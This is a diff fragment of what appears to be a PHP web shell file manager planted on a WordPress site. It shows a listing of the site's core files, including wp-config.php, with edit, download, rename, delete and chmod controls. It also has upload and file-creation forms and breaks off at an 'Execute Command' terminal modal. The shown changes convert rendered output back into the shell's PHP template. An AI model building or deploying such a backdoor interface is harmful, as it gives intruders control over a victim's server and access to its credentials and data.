-                                                    <button class="action-btn" onclick="editFile('apple-touch-icon.png')"><i class="fas fa-edit"></i> Edit</button>
-                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=YXBwbGUtdG91Y2gtaWNvbi5wbmc=" class="action-btn"><i class="fas fa-download"></i> DL</a>
-                                                <button class="action-btn" onclick="renameItem('apple-touch-icon.png')"><i class="fas fa-pen"></i> Ren</button>
-                        <button class="action-btn" onclick="deleteItem('apple-touch-icon.png')"><i class="fas fa-trash"></i> Del</button>
-                                                <button class="action-btn" onclick="chmodItem('apple-touch-icon.png', '0644')"><i class="fas fa-lock"></i> Chmod</button>
-                                            </td>
-                </tr>
-                                <tr>
-                    <td><span class="item-icon">📄</span></td>
-                    <td class="item-name">
-                                                    error_log                                            </td>
-                    <td>2.2 MB</td>
-                    <td><span class="badge">0644</span></td>
-                    <td>2026-04-04 21:37:21</td>
-                    <td class="action-group">
-                                                    <button class="action-btn" onclick="editFile('error_log')"><i class="fas fa-edit"></i> Edit</button>
-                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=ZXJyb3JfbG9n" class="action-btn"><i class="fas fa-download"></i> DL</a>
-                                                <button class="action-btn" onclick="renameItem('error_log')"><i class="fas fa-pen"></i> Ren</button>
-                        <button class="action-btn" onclick="deleteItem('error_log')"><i class="fas fa-trash"></i> Del</button>
-                                                <button class="action-btn" onclick="chmodItem('error_log', '0644')"><i class="fas fa-lock"></i> Chmod</button>
-                                            </td>
-                </tr>
-                                <tr>
-                    <td><span class="item-icon">📄</span></td>
-                    <td class="item-name">
-                                                    F0BE255897E6BE82E1AA62706D5F31D5.txt                                            </td>
-                    <td>53 B</td>
-                    <td><span class="badge">0644</span></td>
-                    <td>2024-08-28 19:44:15</td>
-                    <td class="action-group">
-                                                    <button class="action-btn" onclick="editFile('F0BE255897E6BE82E1AA62706D5F31D5.txt')"><i class="fas fa-edit"></i> Edit</button>
-                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=RjBCRTI1NTg5N0U2QkU4MkUxQUE2MjcwNkQ1RjMxRDUudHh0" class="action-btn"><i class="fas fa-download"></i> DL</a>
-                                                <button class="action-btn" onclick="renameItem('F0BE255897E6BE82E1AA62706D5F31D5.txt')"><i class="fas fa-pen"></i> Ren</button>
-                        <button class="action-btn" onclick="deleteItem('F0BE255897E6BE82E1AA62706D5F31D5.txt')"><i class="fas fa-trash"></i> Del</button>
-                                                <button class="action-btn" onclick="chmodItem('F0BE255897E6BE82E1AA62706D5F31D5.txt', '0644')"><i class="fas fa-lock"></i> Chmod</button>
-                                            </td>
-                </tr>
-                                <tr>
-                    <td><span class="item-icon">🖼️</span></td>
-                    <td class="item-name">
-                                                    favicon-16x16.png                                            </td>
-                    <td>870 B</td>
-                    <td><span class="badge">0644</span></td>
-                    <td>2024-08-28 19:44:15</td>
-                    <td class="action-group">
-                                                    <button class="action-btn" onclick="editFile('favicon-16x16.png')"><i class="fas fa-edit"></i> Edit</button>
-                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=ZmF2aWNvbi0xNngxNi5wbmc=" class="action-btn"><i class="fas fa-download"></i> DL</a>
-                                                <button class="action-btn" onclick="renameItem('favicon-16x16.png')"><i class="fas fa-pen"></i> Ren</button>
-                        <button class="action-btn" onclick="deleteItem('favicon-16x16.png')"><i class="fas fa-trash"></i> Del</button>
-                                                <button class="action-btn" onclick="chmodItem('favicon-16x16.png', '0644')"><i class="fas fa-lock"></i> Chmod</button>
-                                            </td>
-                </tr>
-                                <tr>
-                    <td><span class="item-icon">🖼️</span></td>
-                    <td class="item-name">
-                                                    favicon-32x32.png                                            </td>
-                    <td>2.3 KB</td>
-                    <td><span class="badge">0644</span></td>
-                    <td>2024-08-28 19:44:15</td>
-                    <td class="action-group">
-                                                    <button class="action-btn" onclick="editFile('favicon-32x32.png')"><i class="fas fa-edit"></i> Edit</button>
-                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=ZmF2aWNvbi0zMngzMi5wbmc=" class="action-btn"><i class="fas fa-download"></i> DL</a>
-                                                <button class="action-btn" onclick="renameItem('favicon-32x32.png')"><i class="fas fa-pen"></i> Ren</button>
-                        <button class="action-btn" onclick="deleteItem('favicon-32x32.png')"><i class="fas fa-trash"></i> Del</button>
-                                                <button class="action-btn" onclick="chmodItem('favicon-32x32.png', '0644')"><i class="fas fa-lock"></i> Chmod</button>
-                                            </td>
-                </tr>
-                                <tr>
-                    <td><span class="item-icon">📄</span></td>
-                    <td class="item-name">
-                                                    favicon.ico                                            </td>
-                    <td>15 KB</td>
-                    <td><span class="badge">0644</span></td>
-                    <td>2024-08-28 19:44:15</td>
-                    <td class="action-group">
-                                                    <button class="action-btn" onclick="editFile('favicon.ico')"><i class="fas fa-edit"></i> Edit</button>
-                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=ZmF2aWNvbi5pY28=" class="action-btn"><i class="fas fa-download"></i> DL</a>
-                                                <button class="action-btn" onclick="renameItem('favicon.ico')"><i class="fas fa-pen"></i> Ren</button>
-                        <button class="action-btn" onclick="deleteItem('favicon.ico')"><i class="fas fa-trash"></i> Del</button>
-                                                <button class="action-btn" onclick="chmodItem('favicon.ico', '0644')"><i class="fas fa-lock"></i> Chmod</button>
-                                            </td>
-                </tr>
-                                <tr>
-                    <td><span class="item-icon">🌐</span></td>
-                    <td class="item-name">
-                                                    googleafbd3c1e6198f85e.html                                            </td>
-                    <td>53 B</td>
-                    <td><span class="badge">0644</span></td>
-                    <td>2025-11-10 16:27:26</td>
-                    <td class="action-group">
-                                                    <button class="action-btn" onclick="editFile('googleafbd3c1e6198f85e.html')"><i class="fas fa-edit"></i> Edit</button>
-                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=Z29vZ2xlYWZiZDNjMWU2MTk4Zjg1ZS5odG1s" class="action-btn"><i class="fas fa-download"></i> DL</a>
-                                                <button class="action-btn" onclick="renameItem('googleafbd3c1e6198f85e.html')"><i class="fas fa-pen"></i> Ren</button>
-                        <button class="action-btn" onclick="deleteItem('googleafbd3c1e6198f85e.html')"><i class="fas fa-trash"></i> Del</button>
-                                                <button class="action-btn" onclick="chmodItem('googleafbd3c1e6198f85e.html', '0644')"><i class="fas fa-lock"></i> Chmod</button>
-                                            </td>
-                </tr>
-                                <tr>
-                    <td><span class="item-icon">📄</span></td>
-                    <td class="item-name">
-                                                    image                                            </td>
-                    <td>1.4 KB</td>
-                    <td><span class="badge">0644</span></td>
-                    <td>2025-11-10 16:42:54</td>
-                    <td class="action-group">
-                                                    <button class="action-btn" onclick="editFile('image')"><i class="fas fa-edit"></i> Edit</button>
-                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=aW1hZ2U=" class="action-btn"><i class="fas fa-download"></i> DL</a>
-                                                <button class="action-btn" onclick="renameItem('image')"><i class="fas fa-pen"></i> Ren</button>
-                        <button class="action-btn" onclick="deleteItem('image')"><i class="fas fa-trash"></i> Del</button>
-                                                <button class="action-btn" onclick="chmodItem('image', '0644')"><i class="fas fa-lock"></i> Chmod</button>
-                                            </td>
-                </tr>
-                                <tr>
-                    <td><span class="item-icon">🐘</span></td>
-                    <td class="item-name">
-                                                    index.php                                            </td>
-                    <td>404 B</td>
-                    <td><span class="badge">0644</span></td>
-                    <td>2026-04-04 21:15:05</td>
-                    <td class="action-group">
-                                                    <button class="action-btn" onclick="editFile('index.php')"><i class="fas fa-edit"></i> Edit</button>
-                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=aW5kZXgucGhw" class="action-btn"><i class="fas fa-download"></i> DL</a>
-                                                <button class="action-btn" onclick="renameItem('index.php')"><i class="fas fa-pen"></i> Ren</button>
-                        <button class="action-btn" onclick="deleteItem('index.php')"><i class="fas fa-trash"></i> Del</button>
-                                                <button class="action-btn" onclick="chmodItem('index.php', '0644')"><i class="fas fa-lock"></i> Chmod</button>
-                                            </td>
-                </tr>
-                                <tr>
-                    <td><span class="item-icon">📄</span></td>
-                    <td class="item-name">
-                                                    license.txt                                            </td>
-                    <td>19.4 KB</td>
-                    <td><span class="badge">0644</span></td>
-                    <td>2025-12-24 17:22:50</td>
-                    <td class="action-group">
-                                                    <button class="action-btn" onclick="editFile('license.txt')"><i class="fas fa-edit"></i> Edit</button>
-                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=bGljZW5zZS50eHQ=" class="action-btn"><i class="fas fa-download"></i> DL</a>
-                                                <button class="action-btn" onclick="renameItem('license.txt')"><i class="fas fa-pen"></i> Ren</button>
-                        <button class="action-btn" onclick="deleteItem('license.txt')"><i class="fas fa-trash"></i> Del</button>
-                                                <button class="action-btn" onclick="chmodItem('license.txt', '0644')"><i class="fas fa-lock"></i> Chmod</button>
-                                            </td>
-                </tr>
-                                <tr>
-                    <td><span class="item-icon">🌐</span></td>
-                    <td class="item-name">
-                                                    readme.html                                            </td>
-                    <td>7.3 KB</td>
-                    <td><span class="badge">0644</span></td>
-                    <td>2026-03-12 05:18:39</td>
-                    <td class="action-group">
-                                                    <button class="action-btn" onclick="editFile('readme.html')"><i class="fas fa-edit"></i> Edit</button>
-                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=cmVhZG1lLmh0bWw=" class="action-btn"><i class="fas fa-download"></i> DL</a>
-                                                <button class="action-btn" onclick="renameItem('readme.html')"><i class="fas fa-pen"></i> Ren</button>
-                        <button class="action-btn" onclick="deleteItem('readme.html')"><i class="fas fa-trash"></i> Del</button>
-                                                <button class="action-btn" onclick="chmodItem('readme.html', '0644')"><i class="fas fa-lock"></i> Chmod</button>
-                                            </td>
-                </tr>
-                                <tr>
-                    <td><span class="item-icon">📄</span></td>
-                    <td class="item-name">
-                                                    README.md                                            </td>
-                    <td>754 B</td>
-                    <td><span class="badge">0644</span></td>
-                    <td>2024-08-28 19:44:15</td>
-                    <td class="action-group">
-                                                    <button class="action-btn" onclick="editFile('README.md')"><i class="fas fa-edit"></i> Edit</button>
-                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=UkVBRE1FLm1k" class="action-btn"><i class="fas fa-download"></i> DL</a>
-                                                <button class="action-btn" onclick="renameItem('README.md')"><i class="fas fa-pen"></i> Ren</button>
-                        <button class="action-btn" onclick="deleteItem('README.md')"><i class="fas fa-trash"></i> Del</button>
-                                                <button class="action-btn" onclick="chmodItem('README.md', '0644')"><i class="fas fa-lock"></i> Chmod</button>
-                                            </td>
-                </tr>
-                                <tr>
-                    <td><span class="item-icon">📄</span></td>
-                    <td class="item-name">
-                                                    site.webmanifest                                            </td>
-                    <td>263 B</td>
-                    <td><span class="badge">0644</span></td>
-                    <td>2024-08-28 19:44:15</td>
-                    <td class="action-group">
-                                                    <button class="action-btn" onclick="editFile('site.webmanifest')"><i class="fas fa-edit"></i> Edit</button>
-                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=c2l0ZS53ZWJtYW5pZmVzdA==" class="action-btn"><i class="fas fa-download"></i> DL</a>
-                                                <button class="action-btn" onclick="renameItem('site.webmanifest')"><i class="fas fa-pen"></i> Ren</button>
-                        <button class="action-btn" onclick="deleteItem('site.webmanifest')"><i class="fas fa-trash"></i> Del</button>
-                                                <button class="action-btn" onclick="chmodItem('site.webmanifest', '0644')"><i class="fas fa-lock"></i> Chmod</button>
-                                            </td>
-                </tr>
-                                <tr>
-                    <td><span class="item-icon">🐘</span></td>
-                    <td class="item-name">
-                                                    test.php                                            </td>
-                    <td>6 B</td>
-                    <td><span class="badge">0644</span></td>
-                    <td>2026-04-04 21:12:28</td>
-                    <td class="action-group">
-                                                    <button class="action-btn" onclick="editFile('test.php')"><i class="fas fa-edit"></i> Edit</button>
-                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=dGVzdC5waHA=" class="action-btn"><i class="fas fa-download"></i> DL</a>
-                                                <button class="action-btn" onclick="renameItem('test.php')"><i class="fas fa-pen"></i> Ren</button>
-                        <button class="action-btn" onclick="deleteItem('test.php')"><i class="fas fa-trash"></i> Del</button>
-                                                <button class="action-btn" onclick="chmodItem('test.php', '0644')"><i class="fas fa-lock"></i> Chmod</button>
-                                            </td>
-                </tr>
-                                <tr>
-                    <td><span class="item-icon">🐘</span></td>
-                    <td class="item-name">
-                                                    wp-activate.php                                            </td>
-                    <td>7.2 KB</td>
-                    <td><span class="badge">0644</span></td>
-                    <td>2025-12-24 17:22:50</td>
-                    <td class="action-group">
-                                                    <button class="action-btn" onclick="editFile('wp-activate.php')"><i class="fas fa-edit"></i> Edit</button>
-                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=d3AtYWN0aXZhdGUucGhw" class="action-btn"><i class="fas fa-download"></i> DL</a>
-                                                <button class="action-btn" onclick="renameItem('wp-activate.php')"><i class="fas fa-pen"></i> Ren</button>
-                        <button class="action-btn" onclick="deleteItem('wp-activate.php')"><i class="fas fa-trash"></i> Del</button>
-                                                <button class="action-btn" onclick="chmodItem('wp-activate.php', '0644')"><i class="fas fa-lock"></i> Chmod</button>
-                                            </td>
-                </tr>
-                                <tr>
-                    <td><span class="item-icon">🐘</span></td>
-                    <td class="item-name">
-                                                    wp-blog-header.php                                            </td>
-                    <td>351 B</td>
-                    <td><span class="badge">0644</span></td>
-                    <td>2025-12-24 17:22:50</td>
-                    <td class="action-group">
-                                                    <button class="action-btn" onclick="editFile('wp-blog-header.php')"><i class="fas fa-edit"></i> Edit</button>
-                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=d3AtYmxvZy1oZWFkZXIucGhw" class="action-btn"><i class="fas fa-download"></i> DL</a>
-                                                <button class="action-btn" onclick="renameItem('wp-blog-header.php')"><i class="fas fa-pen"></i> Ren</button>
-                        <button class="action-btn" onclick="deleteItem('wp-blog-header.php')"><i class="fas fa-trash"></i> Del</button>
-                                                <button class="action-btn" onclick="chmodItem('wp-blog-header.php', '0644')"><i class="fas fa-lock"></i> Chmod</button>
-                                            </td>
-                </tr>
-                                <tr>
-                    <td><span class="item-icon">🐘</span></td>
-                    <td class="item-name">
-                                                    wp-comments-post.php                                            </td>
-                    <td>2.3 KB</td>
-                    <td><span class="badge">0644</span></td>
-                    <td>2024-08-28 19:44:15</td>
-                    <td class="action-group">
-                                                    <button class="action-btn" onclick="editFile('wp-comments-post.php')"><i class="fas fa-edit"></i> Edit</button>
-                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=d3AtY29tbWVudHMtcG9zdC5waHA=" class="action-btn"><i class="fas fa-download"></i> DL</a>
-                                                <button class="action-btn" onclick="renameItem('wp-comments-post.php')"><i class="fas fa-pen"></i> Ren</button>
-                        <button class="action-btn" onclick="deleteItem('wp-comments-post.php')"><i class="fas fa-trash"></i> Del</button>
-                                                <button class="action-btn" onclick="chmodItem('wp-comments-post.php', '0644')"><i class="fas fa-lock"></i> Chmod</button>
-                                            </td>
-                </tr>
-                                <tr>
-                    <td><span class="item-icon">🐘</span></td>
-                    <td class="item-name">
-                                                    wp-config-sample.php                                            </td>
-                    <td>3.3 KB</td>
-                    <td><span class="badge">0644</span></td>
-                    <td>2025-12-24 17:22:50</td>
-                    <td class="action-group">
-                                                    <button class="action-btn" onclick="editFile('wp-config-sample.php')"><i class="fas fa-edit"></i> Edit</button>
-                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=d3AtY29uZmlnLXNhbXBsZS5waHA=" class="action-btn"><i class="fas fa-download"></i> DL</a>
-                                                <button class="action-btn" onclick="renameItem('wp-config-sample.php')"><i class="fas fa-pen"></i> Ren</button>
-                        <button class="action-btn" onclick="deleteItem('wp-config-sample.php')"><i class="fas fa-trash"></i> Del</button>
-                                                <button class="action-btn" onclick="chmodItem('wp-config-sample.php', '0644')"><i class="fas fa-lock"></i> Chmod</button>
-                                            </td>
-                </tr>
-                                <tr>
-                    <td><span class="item-icon">🐘</span></td>
-                    <td class="item-name">
-                                                    wp-config.php                                            </td>
-                    <td>3.2 KB</td>
-                    <td><span class="badge">0644</span></td>
-                    <td>2025-12-24 17:22:29</td>
-                    <td class="action-group">
-                                                    <button class="action-btn" onclick="editFile('wp-config.php')"><i class="fas fa-edit"></i> Edit</button>
-                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=d3AtY29uZmlnLnBocA==" class="action-btn"><i class="fas fa-download"></i> DL</a>
-                                                <button class="action-btn" onclick="renameItem('wp-config.php')"><i class="fas fa-pen"></i> Ren</button>
-                        <button class="action-btn" onclick="deleteItem('wp-config.php')"><i class="fas fa-trash"></i> Del</button>
-                                                <button class="action-btn" onclick="chmodItem('wp-config.php', '0644')"><i class="fas fa-lock"></i> Chmod</button>
-                                            </td>
-                </tr>
-                                <tr>
-                    <td><span class="item-icon">🐘</span></td>
-                    <td class="item-name">
-                                                    wp-cron.php                                            </td>
-                    <td>5.5 KB</td>
-                    <td><span class="badge">0644</span></td>
-                    <td>2025-12-24 17:22:50</td>
-                    <td class="action-group">
-                                                    <button class="action-btn" onclick="editFile('wp-cron.php')"><i class="fas fa-edit"></i> Edit</button>
-                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=d3AtY3Jvbi5waHA=" class="action-btn"><i class="fas fa-download"></i> DL</a>
-                                                <button class="action-btn" onclick="renameItem('wp-cron.php')"><i class="fas fa-pen"></i> Ren</button>
-                        <button class="action-btn" onclick="deleteItem('wp-cron.php')"><i class="fas fa-trash"></i> Del</button>
-                                                <button class="action-btn" onclick="chmodItem('wp-cron.php', '0644')"><i class="fas fa-lock"></i> Chmod</button>
-                                            </td>
-                </tr>
-                                <tr>
-                    <td><span class="item-icon">🐘</span></td>
-                    <td class="item-name">
-                                                    wp-links-opml.php                                            </td>
-                    <td>2.4 KB</td>
-                    <td><span class="badge">0644</span></td>
-                    <td>2025-12-24 17:22:50</td>
-                    <td class="action-group">
-                                                    <button class="action-btn" onclick="editFile('wp-links-opml.php')"><i class="fas fa-edit"></i> Edit</button>
-                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=d3AtbGlua3Mtb3BtbC5waHA=" class="action-btn"><i class="fas fa-download"></i> DL</a>
-                                                <button class="action-btn" onclick="renameItem('wp-links-opml.php')"><i class="fas fa-pen"></i> Ren</button>
-                        <button class="action-btn" onclick="deleteItem('wp-links-opml.php')"><i class="fas fa-trash"></i> Del</button>
-                                                <button class="action-btn" onclick="chmodItem('wp-links-opml.php', '0644')"><i class="fas fa-lock"></i> Chmod</button>
-                                            </td>
-                </tr>
-                                <tr>
-                    <td><span class="item-icon">🐘</span></td>
-                    <td class="item-name">
-                                                    wp-load.php                                            </td>
-                    <td>3.8 KB</td>
-                    <td><span class="badge">0644</span></td>
-                    <td>2024-08-28 19:44:15</td>
-                    <td class="action-group">
-                                                    <button class="action-btn" onclick="editFile('wp-load.php')"><i class="fas fa-edit"></i> Edit</button>
-                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=d3AtbG9hZC5waHA=" class="action-btn"><i class="fas fa-download"></i> DL</a>
-                                                <button class="action-btn" onclick="renameItem('wp-load.php')"><i class="fas fa-pen"></i> Ren</button>
-                        <button class="action-btn" onclick="deleteItem('wp-load.php')"><i class="fas fa-trash"></i> Del</button>
-                                                <button class="action-btn" onclick="chmodItem('wp-load.php', '0644')"><i class="fas fa-lock"></i> Chmod</button>
-                                            </td>
-                </tr>
-                                <tr>
-                    <td><span class="item-icon">🐘</span></td>
-                    <td class="item-name">
-                                                    wp-login.php                                            </td>
-                    <td>50.2 KB</td>
-                    <td><span class="badge">0644</span></td>
-                    <td>2025-12-24 17:22:50</td>
-                    <td class="action-group">
-                                                    <button class="action-btn" onclick="editFile('wp-login.php')"><i class="fas fa-edit"></i> Edit</button>
-                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=d3AtbG9naW4ucGhw" class="action-btn"><i class="fas fa-download"></i> DL</a>
-                                                <button class="action-btn" onclick="renameItem('wp-login.php')"><i class="fas fa-pen"></i> Ren</button>
-                        <button class="action-btn" onclick="deleteItem('wp-login.php')"><i class="fas fa-trash"></i> Del</button>
-                                                <button class="action-btn" onclick="chmodItem('wp-login.php', '0644')"><i class="fas fa-lock"></i> Chmod</button>
-                                            </td>
-                </tr>
-                                <tr>
-                    <td><span class="item-icon">🐘</span></td>
-                    <td class="item-name">
-                                                    wp-mail.php                                            </td>
-                    <td>8.5 KB</td>
-                    <td><span class="badge">0644</span></td>
-                    <td>2025-12-24 17:22:50</td>
-                    <td class="action-group">
-                                                    <button class="action-btn" onclick="editFile('wp-mail.php')"><i class="fas fa-edit"></i> Edit</button>
-                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=d3AtbWFpbC5waHA=" class="action-btn"><i class="fas fa-download"></i> DL</a>
-                                                <button class="action-btn" onclick="renameItem('wp-mail.php')"><i class="fas fa-pen"></i> Ren</button>
-                        <button class="action-btn" onclick="deleteItem('wp-mail.php')"><i class="fas fa-trash"></i> Del</button>
-                                                <button class="action-btn" onclick="chmodItem('wp-mail.php', '0644')"><i class="fas fa-lock"></i> Chmod</button>
-                                            </td>
-                </tr>
-                                <tr>
-                    <td><span class="item-icon">🐘</span></td>
-                    <td class="item-name">
-                                                    wp-settings.php                                            </td>
-                    <td>30.3 KB</td>
-                    <td><span class="badge">0644</span></td>
-                    <td>2025-12-24 17:22:50</td>
-                    <td class="action-group">
-                                                    <button class="action-btn" onclick="editFile('wp-settings.php')"><i class="fas fa-edit"></i> Edit</button>
-                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=d3Atc2V0dGluZ3MucGhw" class="action-btn"><i class="fas fa-download"></i> DL</a>
-                                                <button class="action-btn" onclick="renameItem('wp-settings.php')"><i class="fas fa-pen"></i> Ren</button>
-                        <button class="action-btn" onclick="deleteItem('wp-settings.php')"><i class="fas fa-trash"></i> Del</button>
-                                                <button class="action-btn" onclick="chmodItem('wp-settings.php', '0644')"><i class="fas fa-lock"></i> Chmod</button>
-                                            </td>
-                </tr>
-                                <tr>
-                    <td><span class="item-icon">🐘</span></td>
-                    <td class="item-name">
-                                                    wp-signup.php                                            </td>
-                    <td>33.7 KB</td>
-                    <td><span class="badge">0644</span></td>
-                    <td>2025-12-24 17:22:50</td>
-                    <td class="action-group">
-                                                    <button class="action-btn" onclick="editFile('wp-signup.php')"><i class="fas fa-edit"></i> Edit</button>
-                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=d3Atc2lnbnVwLnBocA==" class="action-btn"><i class="fas fa-download"></i> DL</a>
-                                                <button class="action-btn" onclick="renameItem('wp-signup.php')"><i class="fas fa-pen"></i> Ren</button>
-                        <button class="action-btn" onclick="deleteItem('wp-signup.php')"><i class="fas fa-trash"></i> Del</button>
-                                                <button class="action-btn" onclick="chmodItem('wp-signup.php', '0644')"><i class="fas fa-lock"></i> Chmod</button>
-                                            </td>
-                </tr>
-                                <tr>
-                    <td><span class="item-icon">🐘</span></td>
-                    <td class="item-name">
-                                                    wp-trackback.php                                            </td>
-                    <td>5.1 KB</td>
-                    <td><span class="badge">0644</span></td>
-                    <td>2025-12-24 17:22:50</td>
-                    <td class="action-group">
-                                                    <button class="action-btn" onclick="editFile('wp-trackback.php')"><i class="fas fa-edit"></i> Edit</button>
-                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=d3AtdHJhY2tiYWNrLnBocA==" class="action-btn"><i class="fas fa-download"></i> DL</a>
-                                                <button class="action-btn" onclick="renameItem('wp-trackback.php')"><i class="fas fa-pen"></i> Ren</button>
-                        <button class="action-btn" onclick="deleteItem('wp-trackback.php')"><i class="fas fa-trash"></i> Del</button>
-                                                <button class="action-btn" onclick="chmodItem('wp-trackback.php', '0644')"><i class="fas fa-lock"></i> Chmod</button>
-                                            </td>
-                </tr>
-                                <tr>
-                    <td><span class="item-icon">🐘</span></td>
-                    <td class="item-name">
-                                                    xmlrpc.php                                            </td>
-                    <td>3.1 KB</td>
-                    <td><span class="badge">0644</span></td>
-                    <td>2025-12-24 17:22:50</td>
-                    <td class="action-group">
-                                                    <button class="action-btn" onclick="editFile('xmlrpc.php')"><i class="fas fa-edit"></i> Edit</button>
-                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=eG1scnBjLnBocA==" class="action-btn"><i class="fas fa-download"></i> DL</a>
-                                                <button class="action-btn" onclick="renameItem('xmlrpc.php')"><i class="fas fa-pen"></i> Ren</button>
-                        <button class="action-btn" onclick="deleteItem('xmlrpc.php')"><i class="fas fa-trash"></i> Del</button>
-                                                <button class="action-btn" onclick="chmodItem('xmlrpc.php', '0644')"><i class="fas fa-lock"></i> Chmod</button>
-                                            </td>
-                </tr>
-                            </tbody>
+                <?php endforeach; ?>
+            </tbody>
         </table>
     </div>
 </div>
 
 <!-- Modals -->
 <div id="uploadModal" class="modal"><div class="modal-content"><div class="modal-header"><h3><i class="fas fa-upload"></i> Upload</h3><button class="modal-close" onclick="closeModal('uploadModal')">&times;</button></div>
-<form method="post" enctype="multipart/form-data"><input type="hidden" name="csrf_token" value="c2fa896cb7ab4224f8e146a0fd32c79a46b8b67f857b1e1c64bfec7997d0cd01"><div class="modal-body"><input type="file" name="file" required></div><div class="modal-footer"><button type="submit" name="upload" class="btn btn-primary">Upload</button><button type="button" class="btn btn-outline" onclick="closeModal('uploadModal')">Cancel</button></div></form></div></div>
+<form method="post" enctype="multipart/form-data"><input type="hidden" name="csrf_token" value="<?php echo csrf_token(); ?>"><div class="modal-body"><input type="file" name="file" required></div><div class="modal-footer"><button type="submit" name="upload" class="btn btn-primary">Upload</button><button type="button" class="btn btn-outline" onclick="closeModal('uploadModal')">Cancel</button></div></form></div></div>
 
 <div id="folderModal" class="modal"><div class="modal-content"><div class="modal-header"><h3><i class="fas fa-folder-plus"></i> New Folder</h3><button class="modal-close" onclick="closeModal('folderModal')">&times;</button></div>
-<form method="post"><input type="hidden" name="csrf_token" value="c2fa896cb7ab4224f8e146a0fd32c79a46b8b67f857b1e1c64bfec7997d0cd01"><div class="modal-body"><input type="text" name="folder_name" placeholder="Folder name" required></div><div class="modal-footer"><button type="submit" name="create_folder" class="btn btn-primary">Create</button><button type="button" class="btn btn-outline" onclick="closeModal('folderModal')">Cancel</button></div></form></div></div>
+<form method="post"><input type="hidden" name="csrf_token" value="<?php echo csrf_token(); ?>"><div class="modal-body"><input type="text" name="folder_name" placeholder="Folder name" required></div><div class="modal-footer"><button type="submit" name="create_folder" class="btn btn-primary">Create</button><button type="button" class="btn btn-outline" onclick="closeModal('folderModal')">Cancel</button></div></form></div></div>
 
 <div id="fileModal" class="modal"><div class="modal-content"><div class="modal-header"><h3><i class="fas fa-file-plus"></i> New File</h3><button class="modal-close" onclick="closeModal('fileModal')">&times;</button></div>
-<form method="post"><input type="hidden" name="csrf_token" value="c2fa896cb7ab4224f8e146a0fd32c79a46b8b67f857b1e1c64bfec7997d0cd01"><div class="modal-body"><input type="text" name="file_name" placeholder="Filename" required><textarea name="file_content" placeholder="Content (optional)" rows="5"></textarea></div><div class="modal-footer"><button type="submit" name="create_file" class="btn btn-primary">Create</button><button type="button" class="btn btn-outline" onclick="closeModal('fileModal')">Cancel</button></div></form></div></div>
+<form method="post"><input type="hidden" name="csrf_token" value="<?php echo csrf_token(); ?>"><div class="modal-body"><input type="text" name="file_name" placeholder="Filename" required><textarea name="file_content" placeholder="Content (optional)" rows="5"></textarea></div><div class="modal-footer"><button type="submit" name="create_file" class="btn btn-primary">Create</button><button type="button" class="btn btn-outline" onclick="closeModal('fileModal')">Cancel</button></div></form></div></div>
 
 <div id="commandModal" class="modal"><div class="modal-content"><div class="modal-header"><h3><i class="fas fa-terminal"></i> Execute Command</h3><button class="modal-close" onclick="closeCommandModal()">&times;</button></div>
